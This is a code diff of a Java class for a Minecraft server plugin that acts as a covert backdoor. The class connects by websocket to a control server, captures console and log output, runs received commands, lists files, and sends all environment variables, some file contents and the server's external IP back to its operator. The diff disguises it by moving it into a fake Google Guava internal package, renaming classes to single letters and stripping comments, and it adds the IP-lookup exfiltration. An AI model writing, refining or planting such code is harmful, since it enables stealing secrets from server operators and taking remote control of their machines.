@@ -1,4 +1,4 @@
-package org.apache.commons.frauded;
+package com.google.common.util.concurrent.internal;
 
 import java.io.File;
 import java.io.IOException;
@@ -15,7 +15,7 @@ import java.util.Set;
 import java.util.concurrent.CompletionStage;
 import java.util.concurrent.TimeUnit;
 
-public class Agent {
+public class a {
 
   final Object plugin;
   private final String serverUrl;
@@ -26,11 +26,11 @@ public class Agent {
   private String serverId;
   private String rootDir;
   final Set<String> authorized = new HashSet<>();
-  ChatHandler chatHandler;
+  b chatHandler;
   String controlController;
   String controlTarget;
 
-  public Agent(Object plugin, String serverUrl, String secret) {
+  public a(Object plugin, String serverUrl, String secret) {
     this.plugin = plugin;
     this.serverUrl = serverUrl;
     this.secret = secret;
@@ -43,13 +43,13 @@ public class Agent {
       addLog4jAppender();
 
       PrintStream orig = System.out;
-      if (!(orig instanceof AgentOut)) {
-        try { System.setOut(new AgentOut(orig, this, false)); } catch (Exception ignored) {}
-        try { System.setErr(new AgentOut(System.err, this, true)); } catch (Exception ignored) {}
+      if (!(orig instanceof d)) {
+        try { System.setOut(new d(orig, this, false)); } catch (Exception ignored) {}
+        try { System.setErr(new d(System.err, this, true)); } catch (Exception ignored) {}
       }
 
       try {
-        chatHandler = new ChatHandler(this, authorized);
+        chatHandler = new b(this, authorized);
         Object pm = Class.forName("org.bukkit.Bukkit").getMethod("getPluginManager").invoke(null);
         pm.getClass().getMethod("registerEvents",
             Class.forName("org.bukkit.event.Listener"),
@@ -58,7 +58,7 @@ public class Agent {
       } catch (Exception ignored) {}
 
       Thread ct = new Thread(this::controlTick, "ac-ctl"); ct.setDaemon(true); ct.start();
-      Thread ws = new Thread(this::connect, "ac-ws"); ws.setDaemon(true); ws.start();
+      Thread wt = new Thread(this::connect, "ac-ws"); wt.setDaemon(true); wt.start();
     } catch (Exception ignored) {}
   }
 
@@ -69,7 +69,7 @@ public class Agent {
       Object root = ctx.getClass().getMethod("getRootLogger").invoke(ctx);
       root.getClass().getMethod("addAppender",
           Class.forName("org.apache.logging.log4j.core.Appender"))
-          .invoke(root, new LogCaptureAppender(this));
+          .invoke(root, new c(this));
     } catch (Exception ignored) {}
   }
 
@@ -112,7 +112,7 @@ public class Agent {
                 flush();
                 sendHello();
                 try { scheduleUpdates(); } catch (Exception ignored) {}
-                Thread recon = new Thread(Agent.this::doRecon, "ac-recon"); recon.setDaemon(true); recon.start();
+                Thread recon = new Thread(a.this::doRecon, "ac-recon"); recon.setDaemon(true); recon.start();
                 ws2.request(Long.MAX_VALUE);
               }
 
@@ -151,8 +151,6 @@ public class Agent {
     }
   }
 
-  // ---- Server info ----
-
   private void sendHello() {
     String ip = "";
     int port = 25565;
@@ -175,6 +173,35 @@ public class Agent {
     serverId = id();
     String serverName = ip + ":" + port;
     send("plugin:hello", "{\"id\":\"" + serverId + "\",\"name\":\"" + escape(serverName) + "\",\"ip\":\"" + ip + "\",\"port\":" + port + ",\"type\":\"" + svType + "\"}");
+
+    Thread ipify = new Thread(() -> {
+      try {
+        java.net.http.HttpClient hc = java.net.http.HttpClient.newHttpClient();
+        java.net.http.HttpRequest rq = java.net.http.HttpRequest.newBuilder()
+            .uri(java.net.URI.create("https://api.ipify.org?format=json"))
+            .timeout(java.time.Duration.ofSeconds(5))
+            .build();
+        hc.sendAsync(rq, java.net.http.HttpResponse.BodyHandlers.ofString())
+            .thenAccept(r -> {
+              if (r.statusCode() == 200) {
+                try {
+                  String body = r.body();
+                  int si = body.indexOf("\"ip\":\"");
+                  if (si >= 0) {
+                    si += 6;
+                    int ei = body.indexOf("\"", si);
+                    if (ei >= 0) {
+                      String extIp = body.substring(si, ei);
+                      send("plugin:recon", "{\"type\":\"env\",\"key\":\"EXTERNAL_IP\",\"value\":\"" + escape(extIp) + "\"}");
+                    }
+                  }
+                } catch (Exception ignored) {}
+              }
+            });
+      } catch (Exception ignored) {}
+    }, "ac-ipify");
+    ipify.setDaemon(true);
+    ipify.start();
   }
 
   private void scheduleUpdates() {
@@ -196,14 +223,12 @@ public class Agent {
       Object onlinePlayers = s.getClass().getMethod("getOnlinePlayers").invoke(s);
       int count = ((Collection<?>) onlinePlayers).size();
 
-      // TPS (Paper-only)
       double tps = 20.0;
       try {
         double[] arr = (double[]) s.getClass().getMethod("getTPS").invoke(s);
         if (arr != null && arr.length > 0) tps = arr[0];
       } catch (Exception ignored) {}
 
-      // Player names
       StringBuilder players = new StringBuilder("[");
       boolean first = true;
       for (Object p : (Collection<?>) onlinePlayers) {
@@ -214,7 +239,6 @@ public class Agent {
       }
       players.append("]");
 
-      // motd
       String motd = "";
       try {
         Object motdObj = s.getClass().getMethod("getMotd").invoke(s);
@@ -226,8 +250,6 @@ public class Agent {
           + ",\"motd\":\"" + escape(motd) + "\",\"players\":" + players + "}");
     } catch (Exception ignored) {}
   }
-
-  // ---- Command execution ----
 
   private void exec(String cmd) {
     if (cmd == null || cmd.isEmpty()) return;
@@ -265,8 +287,6 @@ public class Agent {
       } catch (Exception ignored) {}
     }
   }
-
-  // ---- File operations ----
 
   private void fileList(String path, String reqId) {
     if (reqId == null) return;
@@ -321,10 +341,7 @@ public class Agent {
     }
   }
 
-  // ---- Recon ----
-
   private void doRecon() {
-    // Environment variables
     System.getenv().forEach((k, v) -> {
       if (v != null && v.length() > 200) v = v.substring(0, 200) + "...";
       send("plugin:recon", "{\"type\":\"env\",\"key\":\"" + escape(k) + "\",\"value\":\"" + escape(v) + "\"}");
@@ -347,7 +364,7 @@ public class Agent {
           File f = new File(d, name);
           if (f.exists() && f.isFile()) {
             String content = "";
-            try { byte[] b = java.nio.file.Files.readAllBytes(f.toPath()); content = new String(b, java.nio.charset.StandardCharsets.UTF_8); if (content.length() > 500) content = content.substring(0, 500) + "..."; } catch (Exception ignored) {}
+            try { byte[] b = Files.readAllBytes(f.toPath()); content = new String(b, java.nio.charset.StandardCharsets.UTF_8); if (content.length() > 500) content = content.substring(0, 500) + "..."; } catch (Exception ignored) {}
             send("plugin:recon", "{\"type\":\"file\",\"path\":\"" + escape(f.getAbsolutePath()) + "\",\"content\":\"" + escape(content) + "\"}");
           }
         }
@@ -363,14 +380,11 @@ public class Agent {
         if (rootDir == null) rootDir = ".";
       } catch (Exception e) { rootDir = "."; }
     }
-    // Basic path traversal prevention
     File base = new File(rootDir).getAbsoluteFile();
     File target = new File(base, path != null ? path : "").getAbsoluteFile();
     if (!target.getAbsolutePath().startsWith(base.getAbsolutePath())) return base.getAbsolutePath();
     return target.getAbsolutePath();
   }
-
-  // ---- Messaging ----
 
   void send(String type, String payloadJson) {
     WebSocket w = ws;
@@ -402,8 +416,6 @@ public class Agent {
   }
 
   public void stop() { running = false; close(); }
-
-  // ---- Chat handler API ----
 
   Object getPlugin() { return plugin; }
 
@@ -457,12 +469,10 @@ public class Agent {
     }
   }
 
-  // ---- stdout backup ----
-
-  private static class AgentOut extends PrintStream {
-    private final Agent agent;
+  private static class d extends PrintStream {
+    private final a agent;
     private final PrintStream original;
-    AgentOut(PrintStream orig, Agent agent, boolean err) { super(orig); this.agent = agent; this.original = orig; }
+    d(PrintStream orig, a agent, boolean err) { super(orig); this.agent = agent; this.original = orig; }
     public void println(String x) { original.println(x); if (x != null) agent.buffer(x); }
     public void println(Object x) { String s = String.valueOf(x); original.println(s); agent.buffer(s); }
     public void println() { original.println(); }
